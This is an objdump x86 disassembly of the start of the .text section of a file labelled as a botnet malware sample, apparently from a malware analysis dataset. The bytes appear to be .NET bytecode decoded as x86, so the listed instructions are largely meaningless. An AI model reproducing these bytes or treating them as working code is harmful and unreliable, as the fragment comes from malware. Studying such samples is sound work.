
malware_samples/botnet/7004730b85d0930433d09385d056a68e4f40849b7d01df2c50714b73d6f6efd5.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	e0 d0                	loopne 0x401fd2
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 f4 59 00    	add    %al,0x59f400
  402013:	00 b8 76 00 00 03    	add    %bh,0x3000076(%eax)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	06                   	push   %es
  4021d0:	26 00 70 7e          	add    %dh,%es:0x7e(%eax)
  4021d4:	10 00                	adc    %al,(%eax)
  4021d6:	00 04 28             	add    %al,(%eax,%ebp,1)
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 ba 21 00       	and    $0x21ba72,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 b2                	jb     0x4021a8
  4021f6:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  4021fa:	8c 00                	mov    %es,(%eax)
  4021fc:	00 06                	add    %al,(%esi)
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 ba 21 00       	and    $0x21ba72,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 c4                	jb     0x4021ea
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 c4 26 00       	and    $0x26c472,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 b4             	add    %dh,-0x4c(%edx)
  4024e4:	21 00                	and    %eax,(%eax)
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
